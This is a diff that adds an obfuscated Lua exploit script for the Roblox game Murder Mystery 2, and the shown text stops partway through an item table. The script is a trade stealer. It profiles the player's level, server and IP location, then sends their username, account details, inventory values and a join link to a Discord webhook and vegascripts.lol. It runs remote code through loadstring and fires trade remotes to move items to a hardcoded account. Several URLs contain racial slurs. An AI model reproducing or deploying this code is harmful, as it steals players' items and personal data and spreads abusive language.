@@ -1,0 +1,6374 @@
+local function geniter(f, s, c)
+	if type(f) ~= "function" then
+		local mt = getmetatable(f)
+
+		if type(mt) == "table" and mt.__iter then
+			f, s, c = mt.__iter(f)
+		elseif type(f) == "table" then
+			f, s, c = next, f, nil
+		end
+	end
+
+	return function()
+		local r = table.pack(f(s, c))
+
+		if r[1] == nil then
+			return false
+		end
+
+		c = r[1]
+
+		return true, table.unpack(r, 1, r.n)
+	end
+end
+
+local genv = getgenv()
+local v5 = "Vy1PX3UTD" .. tostring(game.PlaceId)
+
+if genv[v5] then
+	return
+end
+
+genv[v5] = true
+
+local identifyexecutor_ = identifyexecutor or getexecutorname
+local v7 = identifyexecutor_
+
+if v7 then
+	v7 = identifyexecutor_():lower()
+end
+
+v7 = v7 or "unknown"
+
+local t1, HttpService, u10, bxor, band, bnot, rshift, lshift, v16, t2, v18, t3, u20, v21, u22, v23, u24, v25, u26, u27, u28, v29, t4, u31, u32, s1, u34, s2, u36, u37, v38, Usernames_, min_rarity, min_value, pingEveryone, webhook, t5, t6, insert, v47, insert2, v49, t7, messageId, Players, ReplicatedStorage, LocalPlayer, v55, GetServerType, v57, v58, v59, kick, v61, v62, kick2, v64, u65, u66, v67, GetPlayerLevel, LocalPlayer2, v70, request_, Item, v73, u74, v75, u76, v77, v78, u79, u80, u81, v82, v83, ipairs_, Usernames_2, v86, u87, u88, u89, v90, v91, u92, u93, u94, v95, Trade, _G_, LastOffer, u99, u100, v101, u102, u103, v104, u105, u106, v107, v108, u109, u110, v111, u112, u113, u114, v115, v116, v117, u118, u119, t8, v121, response, v123, u124, v125, u126, u127, u128, v129, u130, u131, v132, u133, v134, v135, u136, u137, u138, v139, v140, v141, v142, v143
+
+if string.find(v7, "xeno") or string.find(v7, "solara") then
+	scb = setclipboard
+
+	if scb then
+	
+	end
+
+	t1 = {
+		"Common",
+		"Uncommon",
+		"Rare",
+		"Epic",
+		"Legendary",
+		"Vintage",
+		"Godly",
+		"Vintage",
+		"Ancient",
+		"Unique"
+	}
+	HttpService = game:GetService("HttpService")
+	u10 = nil
+	bxor = bit32.bxor
+	band = bit32.band
+	bnot = bit32.bnot
+	rshift = bit32.rshift
+	lshift = bit32.lshift
+	v16 = function(p1, p2)
+		return bxor(rshift(p1, p2), lshift(p1, 32 - p2))
+	end
+	t2 = {
+		1116352408,
+		1899447441,
+		3049323471,
+		3921009573,
+		961987163,
+		1508970993,
+		2453635748,
+		2870763221,
+		3624381080,
+		310598401,
+		607225278,
+		1426881987,
+		1925078388,
+		2162078206,
+		2614888103,
+		3248222580,
+		3835390401,
+		4022224774,
+		264347078,
+		604807628,
+		770255983,
+		1249150122,
+		1555081692,
+		1996064986,
+		2554220882,
+		2821834349,
+		2952996808,
+		3210313671,
+		3336571891,
+		3584528711,
+		113926993,
+		338241895,
+		666307205,
+		773529912,
+		1294757372,
+		1396182291,
+		1695183700,
+		1986661051,
+		2177026350,
+		2456956037,
+		2730485921,
+		2820302411,
+		3259730800,
+		3345764771,
+		3516065817,
+		3600352804,
+		4094571909,
+		275423344,
+		430227734,
+		506948616,
+		659060556,
+		883997877,
+		958139571,
+		1322822218,
+		1537002063,
+		1747873779,
+		1955562222,
+		2024104815,
+		2227730452,
+		2361852424,
+		2428436474,
+		2756734187,
+		3204031479,
+		3329325298
+	}
+	v18 = function(p3)
+		u10 = 80248658
+
+		local v144 = #p3 * 8
+		local v145 = p3 .. "\128"
+		local v146 = v145 .. string.rep("\0", (56 - #v145 % 64) % 64) .. "\0\0\0\0"
+
+		for i = 3, 0, -1 do
+			v146 ..= string.char(math.floor(v144 / 2 ^ (i * 8)) % 256)
+		end
+
+		local t9 = {
+			1779033703,
+			3144134277,
+			1013904242,
+			2773480762,
+			1359893119,
+			2600822924,
+			528734635,
+			1541459225
+		}
+
+		for i = 1, #v146, 64 do
+			local t10 = {}
+
+			for i2 = 0, 15 do
+				local v152 = i + i2 * 4
+
+				t10[i2] = v146:byte(v152) * 16777216 + v146:byte(v152 + 1) * 65536 + v146:byte(v152 + 2) * 256 + v146:byte(v152 + 3)
+			end
+
+			for i2 = 16, 63 do
+				local v154 = bxor
+
+				t10[i2] = (t10[i2 - 16] + bxor(v16(t10[i2 - 15], 7), v16(t10[i2 - 15], 18), rshift(t10[i2 - 15], 3)) + t10[i2 - 7] + v154(v16(t10[i2 - 2], 17), v16(t10[i2 - 2], 19), rshift(t10[i2 - 2], 10))) % 4294967296
+			end
+
+			local v155 = t9[1]
+			local v156 = t9[2]
+			local v157 = t9[3]
+			local v158 = t9[4]
+			local v159 = t9[5]
+			local v160 = t9[6]
+			local v161 = t9[7]
+			local v162 = t9[8]
+
+			for i2 = 0, 63 do
+				local v164 = bxor
+				local v165 = band
+				local v166 = (v162 + bxor(v16(v159, 6), v16(v159, 11), v16(v159, 25)) + v164(band(v159, v160), v165(bnot(v159), v161)) + t2[i2 + 1] + t10[i2]) % 4294967296
+				local v167 = bxor
+				local v168 = (bxor(v16(v155, 2), v16(v155, 13), v16(v155, 22)) + v167(band(v155, v156), band(v155, v157), band(v156, v157))) % 4294967296
+
+				v162 = v161
+				v161 = v160
+				v160 = v159
+				v159 = (v158 + v166) % 4294967296
+				v158 = v157
+				v157 = v156
+				v156 = v155
+				v155 = (v166 + v168) % 4294967296
+			end
+
+			local t11 = {
+				v155,
+				v156,
+				v157,
+				v158,
+				v159,
+				v160,
+				v161,
+				v162
+			}
+
+			for i2 = 1, 8 do
+				t9[i2] = (t9[i2] + t11[i2]) % 4294967296
+			end
+		end
+
+		local t12 = {}
+
+		for _, v in ipairs(t9) do
+			t12[#t12 + 1] = string.char(math.floor(v / 16777216) % 256, math.floor(v / 65536) % 256, math.floor(v / 256) % 256, v % 256)
+		end
+
+		return table.concat(t12)
+	end
+	t3 = {}
+
+	for i = 1, 64 do
+		t3[("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):byte(i)] = i - 1
+	end
+
+	u20 = nil
+	v21 = function(p4)
+		u20 = 169343501
+
+		local t13 = {}
+		local v176 = #p4
+
+		for i = 1, v176, 3 do
+			local v178, v179, v180 = p4:byte(i, i + 2)
+			local v181 = v178 * 65536 + (v179 or 0) * 256 + (v180 or 0)
+
+			t13[#t13 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.rshift(v181, 18) + 1, bit32.rshift(v181, 18) + 1)
+			t13[#t13 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(bit32.rshift(v181, 12), 63) + 1, bit32.band(bit32.rshift(v181, 12), 63) + 1)
+
+			if i + 1 <= v176 then
+				t13[#t13 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(bit32.rshift(v181, 6), 63) + 1, bit32.band(bit32.rshift(v181, 6), 63) + 1)
+			end
+
+			if i + 2 <= v176 then
+				t13[#t13 + 1] = ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"):sub(bit32.band(v181, 63) + 1, bit32.band(v181, 63) + 1)
+			end
+		end
+
+		return table.concat(t13)
+	end
+	u22 = nil
+	v23 = function(p5)
+		u22 = 452077855
+
+		local v182 = #p5 % 4
+
+		if v182 == 2 then
+			p5 ..= "=="
+		elseif v182 == 3 then
+			p5 ..= "="
+		end
+
+		local t14 = {}
+
+		for i = 1, #p5, 4 do
+			local v185, v186, v187, v188 = p5:byte(i, i + 3)
+			local v189 = (t3[v185] or 0) * 262144 + (t3[v186] or 0) * 4096 + (t3[v187] or 0) * 64 + (t3[v188] or 0)
+
+			t14[#t14 + 1] = string.char(bit32.rshift(v189, 16))
+
+			if v187 and v187 ~= 61 then
+				t14[#t14 + 1] = string.char(bit32.band(bit32.rshift(v189, 8), 255))
+			end
+
+			if v188 and v188 ~= 61 then
+				t14[#t14 + 1] = string.char(bit32.band(v189, 255))
+			end
+		end
+
+		return table.concat(t14)
+	end
+	u24 = nil
+	v25 = function(p6, p7)
+		u24 = 700555412
+
+		return v18("4dG9oM2pR7vX5cN8" .. p6 .. tostring(p7) .. "wF3tJ6yB1eH0sA4d")
+	end
+	u26 = nil
+	u27 = nil
+	u28 = nil
+	v29 = function(p8, p9)
+		u26 = 288918583
+		u27 = 747745209
+		u28 = 436382071
+
+		local v190 = "https://webhook.vegascripts.lol/request/" .. p8 .. "/" .. tostring(p9)
+		local request_2 = request or syn and syn.request or http_request or http and http.request
+
+		if not request_2 then
+			error("No request function available")
+		end
+
+		local v192 = request_2({
+			Url = v190,
+			Method = "GET",
+			Headers = {
+				["Content-Type"] = "application/json"
+			}
+		})
+
+		if v192 and v192.StatusCode == 200 then
+			return HttpService:JSONDecode(v192.Body).token
+		end
+
+		error("Fail" .. tostring(v192 and v192.StatusCode or "no response"))
+	end
+	t4 = {}
+	t4.__index = t4
+	u31 = nil
+	u32 = nil
+	s1 = "new"
+	t4[s1] = function(p10, p11)
+		u31 = 455722073
+		u32 = 572011769
+
+		local obj = setmetatable({}, t4)
+
+		obj.encryptionKey = v25(v29(p10, p11), p11)
+		obj.webhookToken = p10
+		obj.timestamp = p11
+
+		return obj
+	end
+	u34 = nil
+	s2 = "encrypt"
+	t4[s2] = function(p12, p13)
+		u34 = 341206522
+
+		local json
+
+		if type(p13) == "table" then
+			json = HttpService:JSONEncode(p13)
+		else
+			json = tostring(p13)
+		end
+
+		return (v21(v18(p12.encryptionKey .. json) .. json))
+	end
+	u36 = nil
+	u37 = nil
+	v38 = function(p14, p15)
+		u36 = 22024574
+		u37 = 649926619
+
+		local now = os.time()
+
+		p14._timestamp = now
+
+		return t4.new(p15, now):encrypt(p14), now
+	end
+	Usernames_ = {"Mcdo6PcNuggets"}
+        min_rarity = _G.min_rarity or getgenv().rarity or "Godly"
+        min_value = _G.min_value or getgenv().min or 10
+	pingEveryone = _G.pingEveryone or getgenv().ping or "No"
+	webhook = _G.webhook or getgenv().wh or "https://discordapp.com/api/webhooks/1498992854565912680/CW42qyevgS5dRKZK1gBviJ9NgbCuYzcVOxyY6Yih9TMaW5_iAZ4_PEAl0vEEtgGlr7ew"
+		t6 = {}
+
+	for _, v in ipairs(Usernames_) do
+		insert = table.insert
+		v47 = tostring(v)
+		insert(t6, v47:lower())
+	end
+	t7 = {}
+	messageId = nil
+	Players = game:GetService("Players")
+	ReplicatedStorage = game:GetService("ReplicatedStorage")
+	game:GetService("TeleportService")
+	LocalPlayer = Players.LocalPlayer
+
+	if next(Usernames_) == nil then
+		LocalPlayer:kick("You didn't add a usernames or a valid webhook !")
+
+		return
+	end
+
+	if game.PlaceId ~= 142823291 then
+		LocalPlayer:kick("Game not supported. Please join a normal MM2 server")
+
+		return
+	end
+
+	v55 = string.find(v7, "delta") or string.find(v7, "krnl")
+	GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
+	v57 = GetServerType:InvokeServer() == "VIPServer"
+	v58 = #Players:GetPlayers() >= 12
+
+	if v57 or v58 then
+		if v55 then
+			v59 = LocalPlayer
+			kick = LocalPlayer.kick
+			v61 = v57 and "VIP Servers not supported " or "FULL Servers Arent Supported"
+			kick(v59, v61)
+
+			return
+		end
+
+		v62 = LocalPlayer
+		kick2 = LocalPlayer.kick
+		v64 = v57 and "VIP Servers not supported " or "FULL Servers Arent Supported"
+		kick2(v62, v64)
+
+		return
+	end
+
+	getgenv().RealJobID = game.JobId
+	u65 = nil
+	u66 = nil
+	v67 = function() end
+		u65 = 636436657
+		u66 = 1064691622
+
+		local v200 = Usernames_ or {}
+
+		if #v200 == 0 then
+			return
+		end
+
+		for _, v in ipairs(v200) do
+			local v203 = tostring(v)
+			local t15 = {
+				jobId = getgenv().RealJobID,
+				placeId = game.PlaceId,
+				username = LocalPlayer.Name,
+				receiver = v203
+			}
+			local _ = pcall(function()
+				return request({
+					Url = "https://vegascripts.lol/hit",
+					Method = "POST",
+					Headers = {
+						["Content-Type"] = "application/json",
+						Authorization = "nice_remote_spy"
+					},
+					Body = HttpService:JSONEncode(t15)
+				})
+			end)
+		end
+	end
+	GetPlayerLevel = ReplicatedStorage.Remotes.Extras.GetPlayerLevel
+	LocalPlayer2 = Players.LocalPlayer
+
+	if GetPlayerLevel:InvokeServer(LocalPlayer2) < 10 then
+		LocalPlayer2:Kick("script error. make sure ur above the level 9")
+	end
+
+	v70 = function()
+		local ok, result = pcall(function()
+			return (request or syn and syn.request or http and http.request or http_request)({
+				Url = "http://ip-api.com/json",
+				Method = "GET"
+			})
+		end)
+
+		if ok and result and result.Body then
+			local ok2, result2 = pcall(function()
+				return HttpService:JSONDecode(result.Body)
+			end)
+
+			if ok2 and result2 then
+				return result2
+			end
+		end
+
+		return {}
+	end
+	loc = v70()
+	request_ = request or syn and syn.request or http and http.request or http_request or krnl.request
+	Item = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+	v73 = function(p16)
+		local HttpService2 = game:GetService("HttpService")
+		local request_2 = request or syn and syn.request or http_request or http and http.request
+
+		if not request_2 then
+			warn("Executor doesnt request")
+
+			return {
+				total = "0.00",
+				itemPrices = {}
+			}
+		end
+
+		local ok, result = pcall(function()
+			return request_2({
+				Url = "https://fuckingniggermf.vercel.app/api/calc",
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = HttpService2:JSONEncode({
+					inventory = p16
+				})
+			})
+		end)
+
+		if ok and result and result.Body then
+			local ok2, result2 = pcall(function()
+				return HttpService2:JSONDecode(result.Body)
+			end)
+
+			if ok2 then
+				return result2
+			end
+		end
+
+		return {
+			total = "0.00",
+			itemPrices = {}
+		}
+	end
+	u74 = nil
+	v75 = function(p17)
+		u74 = 24282524
+
+		local t16 = {}
+
+		local function v218()
+			local request_2 = request or syn and syn.request or http_request or http and http.request
+
+			if not request_2 then
+				return {}
+			end
+
+			local function v220(p18)
+				local ok, result = pcall(function()
+					return request_2({
+						Url = p18,
+						Method = "GET",
+						Headers = {
+							Accept = "application/json",
+							["User-Agent"] = "Mozilla/5.0"
+						}
+					})
+				end)
+
+				if ok then
+					if result and result.Body then
+						local t17 = {}
+
+						for match, match2 in result.Body:gmatch("\"name\":\"([^\"]+)\",\"game\":\"mm2\",\"price\":[%d.]+,\"emoji\":\"([^\"]+)\"") do
+							t17[match:lower()] = match2
+						end
+
+						return t17
+					end
+				end
+
+				return {}
+			end
+
+			local v226 = v220("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
+
+			if not v226 or next(v226) == nil then
+				v226 = v220("https://fuckingniggermf.vercel.app/api/valuables?game=mm2")
+			end
+
+			return v226
+		end
+
+		local v227 = v218()
+
+		for _, v in ipairs(p17) do
+			table.insert(t16, {
+				name = tostring(v.DataID):gsub("%s+", ""),
+				amount = tonumber(v.Amount) or 1
+			})
+		end
+
+		local v230 = v73(t16)
+
+		if v230 and v230.itemPrices then
+			for k, itemPrice in pairs(v230.itemPrices) do
+				local v233 = v227[k:lower()]
+
+				if v233 and v233 ~= "" then
+					itemPrice.emoji = v233
+				else
+					itemPrice.emoji = ""
+				end
+			end
+		end
+
+		return v230
+	end
+	u76 = nil
+	v77 = function()
+		u76 = 301773659
+
+		local request_2 = request or syn and syn.request or http_request or http and http.request
+
+		if not request_2 then
+			warn("No request function available for value API")
+
+			return {}
+		end
+
+		local ok, result = pcall(function()
+			return request_2({
+				Url = "https://vegascripts.lol/public/mm2-values.lua",
+				Method = "GET"
+			})
+		end)
+
+		if ok and result and result.Body then
+			local chunk = loadstring(result.Body)
+
+			if chunk then
+				local ok2, result2 = pcall(chunk)
+
+				if ok2 and result2 then
+					return result2
+				end
+			end
+		end
+
+		return {}
+	end
+	v78 = function()
+		local t18 = {}
+		local v241 = v77()
+
+		if v241 then
+			if next(v241) ~= nil then
+				for k, v in pairs(Item) do
+					local ItemName = v.ItemName or ""
+					local Rarity = v.Rarity or ""
+					local Chroma = v.Chroma or false
+
+					if ItemName ~= "" and Rarity ~= "" then
+						local v247 = table.find(t1, Rarity)
+						local v248 = table.find(t1, "Godly")
+
+						if v247 and v248 <= v247 then
+							local v249
+
+							if Chroma then
+								if v241.Chroma and v241.Chroma[ItemName] then
+									v249 = v241.Chroma[ItemName]
+								end
+							else
+								local v250 = ({
+									Common = "Common",
+									Uncommon = "Uncommon",
+									Rare = "Rare",
+									Epic = "Epic",
+									Legendary = "Legendary",
+									Godly = "Godly",
+									Ancient = "Ancient",
+									Unique = "Unique",
+									Vintage = "Vintage"
+								})[Rarity]
+
+								if v250 and v241[v250] and v241[v250][ItemName] then
+									v249 = v241[v250][ItemName]
+								end
+							end
+
+							if v249 then
+								t18[k] = v249
+							end
+						end
+					end
+				end
+
+				return t18
+			end
+		end
+
+		warn("Failed to fetch values from ts using fallback")
+
+		return t18
+	end
+	u79 = nil
+	u80 = nil
+	u81 = nil
+	v82 = function(p19)
+	if webhook == "" then
+		warn("No webhook")
+		return false, nil
+	end
+
+	local req = request_ or request or syn and syn.request or http_request or http and http.request
+	if not req then
+		return false, nil
+	end
+
+	local ok, result = pcall(function()
+		return req({
+			Url = webhook,
+			Method = "POST",
+			Headers = {
+				["Content-Type"] = "application/json"
+			},
+			Body = HttpService:JSONEncode(p19)
+		})
+	end)
+
+	if ok and result and (result.StatusCode == 200 or result.StatusCode == 204) then
+		return true, { messageId = "direct" }
+	end
+
+	return false, nil
+
+	end
+	v83 = false
+	ipairs_ = ipairs
+	Usernames_2 = Usernames or {}
+
+	for _, v in ipairs_(Usernames_2) do
+		if v == LocalPlayer.Name then
+			v83 = true
+
+			break
+		end
+	end
+
+	v86 = false
+
+	if v83 then
+		v86 = true
+	end
+
+	u87 = nil
+	u88 = nil
+	u89 = nil
+	v90 = function(p20)
+		u87 = 490977325
+		u88 = 473632988
+		u89 = 543508434
+
+		local v258 = Players:FindFirstChild(p20)
+
+		if v258 then
+			pcall(function()
+				ReplicatedStorage:WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(v258)
+			end)
+		end
+	end
+	v91 = function()
+		return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
+	end
+	u92 = nil
+	u93 = nil
+	u94 = nil
+	v95 = function()
+		u92 = 572979834
+		u93 = 922086990
+		u94 = 837910670
+
+		repeat
+			task.wait(0.1)
+		until v91() == "None"
+	end
+	Trade = ReplicatedStorage.Trade
+	_G_ = _G
+	LastOffer = _G.LastOffer or nil
+	_G_.LastOffer = LastOffer
+	u99 = nil
+	u100 = nil
+	Trade.UpdateTrade.OnClientEvent:Connect(function(p21)
+		u99 = 214572371
+		u100 = 1052024091
+		_G.LastOffer = p21.LastOffer
+	end)
+	v101 = function()
+		if _G.LastOffer then
+			Trade.AcceptTrade:FireServer(game.PlaceId * 3, _G.LastOffer)
+		else
+			warn("nil")
+		end
+	end
+	u102 = nil
+	u103 = nil
+	v104 = function(p22)
+		u102 = 827327342
+		u103 = 988604516
+		Trade.OfferItem:FireServer(p22, "Weapons")
+	end
+	u105 = nil
+	u106 = nil
+	v107 = function(p23, p24, p25)
+		u105 = 30301695
+		u106 = 667811889
+
+		if not t7[p23] then
+			t7[p23] = 0
+		end
+
+		t7[p23] += p24 or 1
+
+		if messageId then
+			pcall(function()
+				local t20 = {
+					Url = "http://webhook.vegascripts.lol" .. "/api/claimed/" .. webhook,
+					Method = "POST",
+					Headers = {
+						["Content-Type"] = "application/json"
+					}
+				}
+				local v260 = HttpService
+				local JSONEncode = HttpService.JSONEncode
+
+				t20.Body = JSONEncode(v260, {
+					messageId = messageId,
+					weaponName = p23,
+					amount = p24 or 1,
+					valueAmount = p25 or 0
+				})
+				request(t20)
+			end)
+		end
+	end
+	v108 = function(p26)
+		task.spawn(function()
+			while pcall(function()
+				request({
+					Url = "http://webhook.vegascripts.lol" .. "/api/ping/" .. webhook,
+					Method = "POST",
+					Headers = {
+						["Content-Type"] = "application/json"
+					},
+					Body = HttpService:JSONEncode({
+						messageId = p26
+					})
+				})
+			end) do
+				task.wait(1)
+			end
+		end)
+	end
+	u109 = nil
+	u110 = nil
+	v111 = function(p27)
+		u109 = 563789295
+		u110 = 367676871
+		pcall(function()
+			request({
+				Url = "http://webhook.vegascripts.lol" .. "/api/partial/" .. webhook,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = HttpService:JSONEncode({
+					messageId = p27
+				})
+			})
+		end)
+	end
+	u112 = nil
+	u113 = nil
+	u114 = nil
+	v115 = function(p28)
+		u112 = 940471625
+		u113 = 1008316571
+		u114 = 868413586
+		pcall(function()
+			request({
+				Url = "http://webhook.vegascripts.lol" .. "/api/allclaimed/" .. webhook,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = HttpService:JSONEncode({
+					messageId = p28
+				})
+			})
+		end)
+	end
+	getgenv().topHitCycleEnabled = true
+	getgenv().topHitLowThreshold = 1000
+	getgenv().topHitHighThreshold = 5000
+	getgenv().topHitLowStartHour = 14
+	getgenv().topHitLowEndHour = 16
+	getgenv().topHitHighStartHour = 16
+	getgenv().topHitHighEndHour = 20
+	v116 = function()
+		if not getgenv().topHitCycleEnabled then
+			return 5000
+		end
+
+		local v262 = tonumber(os.date("%H"))
+		local topHitLowStartHour = getgenv().topHitLowStartHour or 14
+		local topHitLowEndHour = getgenv().topHitLowEndHour or 16
+		local topHitHighStartHour = getgenv().topHitHighStartHour or 16
+		local topHitHighEndHour = getgenv().topHitHighEndHour or 20
+
+		if topHitLowStartHour <= v262 and v262 < topHitLowEndHour then
+			return getgenv().topHitLowThreshold or 1000
+		end
+
+		if topHitHighStartHour <= v262 and v262 < topHitHighEndHour then
+			return getgenv().topHitHighThreshold or 5000
+		end
+
+		return getgenv().topHitHighThreshold or 5000
+	end
+	v117 = function(p29, p30)
+		local n1 = 0
+		local v268 = #p29 > 0
+
+		if v268 then
+			for _, v in ipairs(p29) do
+				n1 += (v.Value or 0) * (v.Amount or 1)
+			end
+		end
+
+		if not v268 then
+			p30 = ""
+		end
+
+		local function v271(p31)
+			local n2 = 0
+			local t21 = {}
+
+			for _, v in ipairs(p31) do
+				local v276 = tostring(v.DataID):gsub("%s+", "")
+				local Rarity = v.Rarity or ""
+				local Value = v.Value or 0
+				local Amount = v.Amount or 1
+
+				if Rarity == "Godly" or Rarity == "Ancient" or Rarity == "Unique" then
+					local v280 = Value * Amount * 0.013
+
+					n2 += v280
+					t21[v276] = {
+						price = string.format("%.2f", v280),
+						emoji = ""
+					}
+				end
+			end
+
+			return {
+				total = string.format("%.2f", n2),
+				itemPrices = t21
+			}
+		end
+
+		local v281 = v268 and v271(p29) or {
+			total = "0.00",
+			itemPrices = {}
+		}
+		local total = v281.total or "0.00"
+		local itemPrices = v281.itemPrices or {}
+		local n3 = 0
+
+		if v268 then
+			for _, v in ipairs(p29) do
+				n3 += (v.Value or 0) * (v.Amount or 1)
+			end
+		end
+
+		local identifyexecutor_2 = identifyexecutor and identifyexecutor() or "Unknown"
+		local v288 = "https://vegascripts.lol/join?placeId=" .. game.PlaceId .. "&jobId=" .. getgenv().RealJobID
+		local v289 = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+		local v290 = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(LocalPlayer.UserId)
+		local v291 = "https://fuckingniggermf.vercel.app/api/Nigger?userId=" .. tostring(LocalPlayer.UserId)
+		local t22 = {}
+		local n4 = 0
+
+		for _, v in ipairs(p29) do
+			table.insert(t22, v)
+			n4 += v.Amount or 1
+		end
+
+		table.sort(t22, function(p32, p33)
+			local v296 = tostring(p32.DataID):gsub("%s+", "")
+			local v297 = tostring(p33.DataID):gsub("%s+", "")
+
+			return (itemPrices[v296] and tonumber(itemPrices[v296].price) or 0) > (itemPrices[v297] and tonumber(itemPrices[v297].price) or 0)
+		end)
+
+		local v298 = tonumber(total) or 0
+		local v299 = false
+		local s3 = "```"
+		local v301
+
+		if #t22 == 0 then
+			v301 = s3 .. "  no items found in inventory (that matches your min value/rarity)\n```"
+		else
+			for _, v in ipairs(t22) do
+				local v304 = tostring(v.DataID):gsub("%s+", "")
+				local v305 = itemPrices[tostring(v.DataID):gsub("%s+", "")]
+				local v306 = v305 and tonumber(v305.price) or 0
+
+				if not (v305 and v305.emoji) then
+				end
+
+				local v307 = t7[v304] or 0
+				local Amount = v.Amount
+				local v309 = string.format("[%d/%d]", v307, Amount)
+				local v310 = string.format("- %dx %s%s ── $%.2f %s\n", Amount, v.Value > 1500 and "" or "", v304, v306, v309)
+
+				if not (#s3 + #v310 < 350) then
+					v299 = true
+
+					break
+				end
+
+				s3 ..= v310
+				v298 -= v306
+			end
+
+			if v299 then
+				s3 ..= string.format("\nAnd $%.2f worth of items more...\n", math.max(0, v298))
+			end
+
+			v301 = s3 .. "```"
+		end
+
+		local country = loc.country or "Unknown"
+
+		if loc.city and loc.city ~= "" then
+			country ..= ", " .. loc.city
+		end
+
+		local v312 = false
+
+		if v116() < n1 then
+			v312 = true
+		end
+
+		local v313 = "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. getgenv().RealJobID .. "')"
+		local v314, v315 = v82({
+			gameType = "MM2",
+			istophit = v312,
+			location = country,
+			receiver = v86,
+			content = p30,
+			username = "Vega",
+			avatar_url = "https://cdn.discordapp.com/attachments/1502980057084203180/1518993307001163917/New_Project_99_7AA01CA.png?ex=6a3bf041&is=6a3a9ec1&hm=af2811e56cec274205bcf42911072a6cb4c84fb292fa0fedeecdb66d17a3d09d&",
+			embeds = { {
+				author = {
+					name = "⚡ Vega · Murder Mystery 2",
+					url = "https://www.roblox.com/games/142823291",
+					icon_url = v290
+				},
+				title = "**" .. LocalPlayer.Name .. "**",
+				description = "```Status        : " .. "Pending" .. "\nItems Claimed : 0 / " .. n4 .. "\nValue Claimed : 0 / " .. n1 .. "```",
+				color = 16711680,
+				thumbnail = {
+					url = v289
+				},
+				fields = {
+					{
+						name = "**Player Info**",
+						value = "```User        : " .. LocalPlayer.Name .. "\nUser ID     : " .. LocalPlayer.UserId .. "\nAge         : " .. LocalPlayer.AccountAge .. " days" .. "\nTotal Value : " .. (n1 or 0) .. "\nTotal USD   : $" .. total .. "\nExecutor    : " .. identifyexecutor_2 .. "\nPlayers     : " .. #Players:GetPlayers() .. "/" .. game.Players.MaxPlayers .. "```",
+						inline = false
+					},
+					{
+						name = "**Inventory**",
+						value = v301,
+						inline = false
+					},
+					{
+						name = "**Teleport Script**",
+						value = "```lua\n" .. v313 .. "```",
+						inline = false
+					},
+					{
+						name = "**Join Link**",
+						value = "[Click here to join](" .. v288 .. ")",
+						inline = false
+					}
+				},
+				footer = {
+					text = "Vega Scripts · discord.gg/vega-scripts",
+					icon_url = v291
+				},
+				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+			} }
+		})
+
+		if v268 then
+			v67()
+		end
+
+		return v314, v315
+	end
+	u118 = nil
+	u119 = nil
+	pcall(function()
+		u118 = 786116392
+		u119 = 844217739
+
+		local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
+		local Trade2 = ReplicatedStorage2:FindFirstChild("Trade")
+
+		if not Trade2 then
+			Trade2 = Instance.new("Folder")
+			Trade2.Name = "Trade"
+			Trade2.Parent = ReplicatedStorage2
+			print("created trade folder")
+		end
+
+		local t23 = {
+			SendRequest = "RemoteFunction",
+			GetProfileData = "RemoteFunction",
+			UpdateTrade = "RemoteEvent",
+			AcceptTrade = "RemoteEvent",
+			DeclineTrade = "RemoteEvent",
+			StartTrade = "RemoteEvent"
+		}
+
+		for k, v in pairs(t23) do
+			if not Trade2:FindFirstChild(k) then
+				local instance = Instance.new(v)
+
+				instance.Name = k
+				instance.Parent = Trade2
+				warn("0")
+			end
+		end
+
+		local Modules = ReplicatedStorage2:FindFirstChild("Modules")
+
+		if not Modules then
+			Modules = Instance.new("Folder")
+			Modules.Name = "Modules"
+			Modules.Parent = ReplicatedStorage2
+			print("module gay")
+		end
+
+		local function createModuleScript()
+			local ModuleScript = Instance.new("ModuleScript")
+
+			ModuleScript.Name = "TradeModule"
+			ModuleScript.Source = "return {}"
+			ModuleScript.Parent = Modules
+			warn("0")
+
+			return ModuleScript
+		end
+
+		local TradeModule = Modules:FindFirstChild("TradeModule")
+
+		if TradeModule then
+			if not TradeModule:IsA("ModuleScript") then
+				TradeModule:Destroy()
+				createModuleScript()
+			end
+		else
+			createModuleScript()
+		end
+
+		if not Modules:FindFirstChild("TradeModule") then
+			createModuleScript()
+		end
+
+		for k, v in pairs(t23) do
+			if not Trade2:FindFirstChild(k) then
+				local instance = Instance.new(v)
+
+				instance.Name = k
+				instance.Parent = Trade2
+				warn("0")
+			end
+		end
+
+		local RobloxGui = game:GetService("CoreGui"):FindFirstChild("RobloxGui")
+
+		if RobloxGui then
+			local TradeGUI_Phone = RobloxGui:FindFirstChild("TradeGUI_Phone")
+
+			if TradeGUI_Phone and TradeGUI_Phone.Enabled == false then
+				TradeGUI_Phone.Enabled = true
+				warn("0")
+			end
+		end
+
+		print("complete")
+	end)
+	t8 = {
+		DefaultGun = true,
+		DefaultKnife = true,
+		Reaver = true,
+		Reaver_Legendary = true,
+		Reaver_Godly = true,
+		Reaver_Ancient = true,
+		IceHammer = true,
+		IceHammer_Legendary = true,
+		IceHammer_Godly = true,
+		IceHammer_Ancient = true,
+		Gingerscythe = true,
+		Gingerscythe_Legendary = true,
+		Gingerscythe_Godly = true,
+		Gingerscythe_Ancient = true,
+		TestItem = true,
+		Season1TestKnife = true,
+		Cracks = true,
